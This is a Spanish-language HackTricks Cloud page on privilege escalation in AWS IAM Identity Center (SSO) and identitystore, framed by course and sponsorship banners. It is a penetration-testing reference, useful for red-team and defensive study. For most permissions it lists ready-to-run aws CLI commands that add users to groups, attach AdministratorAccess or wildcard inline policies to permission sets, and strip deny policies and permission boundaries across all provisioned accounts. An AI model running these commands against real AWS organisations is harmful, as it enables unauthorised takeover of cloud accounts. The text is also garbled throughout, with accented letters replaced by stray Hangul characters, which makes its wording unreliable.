# AWS - SSO & identitystore Privesc

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## AWS Identity Center / AWS SSO

Para m치s informaci칩n sobre AWS Identity Center / AWS SSO, consulta:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Ten en cuenta que por **defecto**, solo los **usuarios** con permisos **del** **Management Account** podr치n acceder y **controlar el IAM Identity Center**.\
Los usuarios de otras cuentas solo pueden permitirlo si la cuenta es un **Administrador Delegado.**\
[Consulta la documentaci칩n para m치s informaci칩n.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)
{% endhint %}

### ~~Restablecer Contrase침a~~

Una forma f치cil de escalar privilegios en casos como este ser칤a tener un permiso que permita restablecer las contrase침as de los usuarios. Desafortunadamente, solo es posible enviar un correo electr칩nico al usuario para que restablezca su contrase침a, por lo que necesitar칤as acceso al correo electr칩nico del usuario.

### `identitystore:CreateGroupMembership`

Con este permiso es posible establecer un usuario dentro de un grupo para que herede todos los permisos que el grupo tiene.

{% code overflow="wrap" %}
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Un atacante con este permiso podr칤a otorgar permisos adicionales a un Conjunto de Permisos que se concede a un usuario bajo su control

{% code overflow="wrap" %}
```bash
# Set an inline policy with admin privileges
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Content of /tmp/policy.yaml
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Statement1",
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Un atacante con este permiso podr칤a otorgar permisos adicionales a un Conjunto de Permisos que se concede a un usuario bajo su control

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

Un atacante con este permiso podr칤a otorgar permisos adicionales a un Conjunto de Permisos que se ha concedido a un usuario bajo su control.

{% hint style="warning" %}
Para abusar de estos permisos en este caso necesitas conocer el **nombre de una pol칤tica gestionada por el cliente que est칠 dentro de TODAS las cuentas** que van a ser afectadas.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:CreateAccountAssignment`

Un atacante con este permiso podr칤a asignar un Conjunto de Permisos a un usuario bajo su control en una cuenta.

{% code overflow="wrap" %}
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
### `sso:GetRoleCredentials`

Devuelve las credenciales temporales STS para un nombre de rol dado que est치 asignado al usuario.

{% code overflow="wrap" %}
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
{% endcode %}

Sin embargo, necesitas un token de acceso del que no estoy seguro c칩mo obtener (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

Un atacante con este permiso puede eliminar la asociaci칩n entre una pol칤tica gestionada de AWS del conjunto de permisos especificado. Es posible otorgar m치s privilegios **desasociando una pol칤tica gestionada (pol칤tica de denegaci칩n)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

Un atacante con este permiso puede eliminar la asociaci칩n entre una pol칤tica administrada por el cliente del conjunto de permisos especificado. Es posible otorgar m치s privilegios mediante **el desasociamiento de una pol칤tica administrada (pol칤tica de denegaci칩n)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed-policy-reference <value>
```
### `sso:DeleteInlinePolicyFromPermissionSet`

Un atacante con este permiso puede eliminar los permisos de una pol칤tica en l칤nea del conjunto de permisos. Es posible otorgar **m치s privilegios al desvincular una pol칤tica en l칤nea (pol칤tica de denegaci칩n)**.

{% code overflow="wrap" %}
```bash
aws sso-admin delete-inline-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN>
```
### `sso:DeletePermissionBoundaryFromPermissionSet`

Un atacante con este permiso puede eliminar el L칤mite de Permiso del conjunto de permisos. Es posible otorgar **m치s privilegios al eliminar las restricciones del Conjunto de Permisos** proporcionadas por el L칤mite de Permiso.

{% code overflow="wrap" %}
```bash
aws sso-admin   delete-permissions-boundary-from-permission-set --instance-arn <value> --permission-set-arn <value>
```
<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
